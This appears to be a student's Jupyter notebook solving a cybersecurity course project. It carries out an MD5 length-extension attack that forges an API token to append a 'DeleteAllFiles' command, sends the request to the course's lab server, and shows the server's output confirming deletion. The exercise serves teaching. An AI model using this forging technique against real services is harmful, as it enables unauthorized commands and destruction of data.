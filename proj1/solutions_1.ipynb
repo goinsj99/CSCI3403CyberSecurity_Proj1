{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "import http.client \n",
    "import urllib.parse \n",
    "import sys\n",
    "import pymd5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pymd5 import md5, padding\n",
    "\n",
    "original_url = 'https://csci3403.com/proj1/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp'\n",
    "og_query = 'user=admin&command1=ListFiles&command2=NoOp'\n",
    "original_query = b'user=admin&command1=ListFiles&command2=NoOp'\n",
    "h = md5()\n",
    "h.update(original_query)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "d037150d6ddc74fff8db6e4d6d5bbf28\n"
     ]
    }
   ],
   "source": [
    "original_token = '1e755d78dcb4d783b2573b8d04fcc48a'\n",
    "original_message_length = len(original_query) + 8\n",
    "message_padding = pymd5.padding(original_message_length*8)\n",
    "total_len = (original_message_length + len(message_padding)) * 8\n",
    "h = pymd5.md5(state=bytes.fromhex(original_token), count=total_len)\n",
    "\n",
    "suffix = '&command3=DeleteAllFiles'\n",
    "h.update(suffix.encode())\n",
    "updated_token = h.hexdigest()\n",
    "print(updated_token)\n",
    "\n",
    "url_safe_padding = urllib.parse.quote(message_padding)\n",
    "\n",
    "# updated_query = og_query + url_safe_padding + suffix\n",
    "# new_url = f\"https://csci3403.com/proj1/api?token={updated_token}&{updated_query}\"\n",
    "# print(new_url)\n",
    "updated_query = 'token={}&{}{}{}'.format(updated_token, og_query, url_safe_padding, suffix)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/proj1/api?token=d037150d6ddc74fff8db6e4d6d5bbf28&user=admin&command1=ListFiles&command2=NoOp%80%00%00%00%00%98%01%00%00%00%00%00%00&command3=DeleteAllFiles\n",
      "b'<h1>Hi admin!</h1><h2>Executing ListFiles . . . </h2>VeryImportDocuments.docx</br>SuperSecretFiles.txt</br>SecurityClassGrades.xlsx</br>password.txt</br>id_rsa</br><h2>Executing NoOp\\x80\\x00\\x00\\x00\\x00\\x98\\x01\\x00\\x00\\x00\\x00\\x00\\x00 . . . </h2><h2>Executing DeleteAllFiles . . . </h2>All your files are gone.  Have a nice day!</br>'\n"
     ]
    }
   ],
   "source": [
    "new_url = 'https://csci3403.com/proj1/api?{}'.format(updated_query)\n",
    "parsed_url = urllib.parse.urlparse(new_url)\n",
    "conn = http.client.HTTPSConnection(parsed_url.hostname, parsed_url.port)\n",
    "print(parsed_url.path + \"?\" + parsed_url.query)\n",
    "conn.request(\"GET\", parsed_url.path + \"?\" + parsed_url.query)\n",
    "print(conn.getresponse().read())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
